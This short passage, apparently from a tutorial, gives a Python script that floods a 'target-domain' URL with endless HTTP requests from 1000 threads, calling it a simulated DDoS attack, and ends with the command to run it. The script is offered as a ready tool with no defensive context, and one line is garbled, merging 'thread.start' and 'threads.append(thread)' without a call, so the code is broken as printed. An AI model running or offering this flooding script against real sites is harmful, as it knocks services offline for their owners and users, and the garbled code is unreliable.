You can also use a simple Python script to simulate a DDoS attack by making numerous HTTP requests.

Create a Python Script:

import threading
import requests

target_url = "http://target-domain"
number_of_requests = 1000

def send_request():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Request sent: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(e)

threads = []

for i in range(number_of_requests):
    thread = threading.Thread(target=send_request)
    thread.start       threads.append(thread)

for thread in threads:
    thread.join()
Run the Python Script:

python3 ddos.py
